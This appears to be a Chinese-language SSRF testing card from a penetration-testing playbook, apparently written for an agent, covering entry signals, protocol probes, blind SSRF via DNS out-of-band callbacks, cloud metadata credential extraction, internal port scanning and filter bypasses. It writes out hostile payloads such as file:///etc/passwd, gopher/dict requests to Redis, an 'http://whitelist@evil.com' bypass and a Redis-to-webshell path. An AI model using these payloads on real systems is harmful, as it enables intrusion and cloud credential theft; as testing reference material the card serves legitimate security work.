# SSRF 决策卡 (Light Deep Card)

> **CWE**: 918 | **ROI**: 极高 (P0)
> **轻便原则**: 只放 SSRF 高 ROI 路由: 信号判断 / 协议路由 / 云元数据 / 内网探测。具体 gopher/dict payload 不堆。

---

## 0. First-pass Signal

| 信号 | 判断 | 下一步 |
|------|------|--------|
| URL 参数 (url= / path= / img= / callback= / src= / refer=) | SSRF 入口 | §1 |
| 文件导入/图片代理/预览功能 | SSRF 高概率入口 | §1 |
| Webhook / 回调 URL | SSRF 入口 | §2 |
| 响应包含外部资源内容 | SSRF 确认 | §3 |
| 响应时间差异 (内网 vs 外网) | 盲 SSRF | §2 |

记录三要素: `HTTP_CODE`, `RESP_LENGTH_DELTA`, `TIMING_DELAY`。

---

## 1. 协议路由

### 1.1 First-pass 探测顺序

| 协议 | 用途 | 示例 |
|------|------|------|
| `http://` | 基础探测 | `http://127.0.0.1` |
| `file://` | 本地文件读取 | `file:///etc/passwd` |
| `dict://` | 服务指纹 | `dict://127.0.0.1:6379/INFO` |
| `gopher://` | 精确构造请求 | `gopher://127.0.0.1:6379/_SET%20key%20value` |

### 1.2 判断

```
1. 先测 http://127.0.0.1 → 有响应差异 → SSRF 确认
2. 测 http://8.8.8.8 → 对比响应时间 (内网快,外网慢)
3. 确认后 → 立即测云元数据
```

---

## 2. 盲 SSRF

### 2.1 DNS OOB

```
url=http://<随机>.your-dnslog.cn/test
```

DNSLog 收到查询 → SSRF 确认。OOB 通道见 [../oob-infrastructure.md](../oob-infrastructure.md)。

### 2.2 Time-based

```
url=http://127.0.0.1:80    → 快速响应
url=http://192.168.1.1:80  → 内网响应
url=http://8.8.8.8:81      → 超时
```

端口开放 → 快速响应;关闭 → 超时;借此探测内网端口。

### 2.3 Webhook 差异

有些 SSRF 在 Webhook 回调时才有输出,检查回调接收的 HTTP 请求头/Body。

---

## 3. 云元数据 (最高 ROI)

确认 SSRF 后**首选**测试云元数据 endpoint (AWS / 阿里云 / 腾讯云 / GCP / Azure)。

完整 endpoint 表 + IMDSv2 Token 流程 + 各云 Header 要求 + AK/SK 提取 → [../cloud-security.md](../cloud-security.md) §1。

**读到 AK/SK → Critical, HITL 确认后续操作边界**。

---

## 4. 内网探测

### 4.1 常见内网目标

| 目标 | 地址 | 检查 |
|------|------|------|
| Redis | `127.0.0.1:6379` | 未授权 → 写 crontab/webshell |
| MySQL | `127.0.0.1:3306` | gopher 构造查询 |
| Elasticsearch | `127.0.0.1:9200` | `/_cat/indices` |
| Kubernetes | `127.0.0.1:10250` | `/pods` |
| Docker API | `127.0.0.1:2375` | `/containers/json` |

### 4.2 网段扫描

```
http://192.168.1.{1-254}
http://10.0.0.{1-254}
http://172.16.{0-255}.1
```

长扫描 → `run_in_background` + HITL 确认范围。

---

## 5. 绕过

| 过滤 | 绕过方法 |
|------|----------|
| 禁止 127.0.0.1 | `0x7f000001` / `0177.0.0.1` / `[::1]` / `0.0.0.0` |
| 禁止内网 IP | DNS 重绑定 (`a.b.c.d` → `127.0.0.1`) / 302 跳转 |
| 禁止 http:// | `gopher://` / `dict://` / `file://` |
| URL 白名单 | `@` 绕过: `http://whitelist@evil.com` / 302 跳转 |
| 域名黑名单 | 短链接 / IP 短格式 / IPv6 映射 |

---

## 6. Triage

| 现象 | 可能原因 | 下一步 |
|------|----------|--------|
| 请求无响应/超时 | SSRF 出口受限 / 防火墙 | 试 DNS OOB;试不同协议 |
| 响应内容是外网页面 | SSRF 可出网 | 测内网;测云元数据 |
| 响应与直接访问目标不同 | WAF/代理修改 | 检查 Header 差异 |
| 只能 HTTP/HTTPS | 协议限制 | 用 302 跳转到 gopher:// |
| 302 跳转被阻止 | 跟随重定向被禁 | 试直接 gopher;试 DNS 重绑定 |

---

## 7. 级联

- SSRF → 云元数据 → AK/SK → [../cloud-security.md](../cloud-security.md) §2-4
- SSRF → Redis 未授权 → RCE → [cmdi.md](cmdi.md)
- SSRF → 内网服务 → [../recon.md](../recon.md) §9
- SSRF + 文件读取 → [path-traversal.md](path-traversal.md)

---

## 8. 相关参考

- 云安全 → [../cloud-security.md](../cloud-security.md)
- OOB 通道 → [../oob-infrastructure.md](../oob-infrastructure.md)
- 信息收集 (后端站) → [../recon.md](../recon.md) §9
- WAF 绕过 → [../waf-bypass.md](../waf-bypass.md)
- Scenarios → [ssrf-scenarios.md](ssrf-scenarios.md)
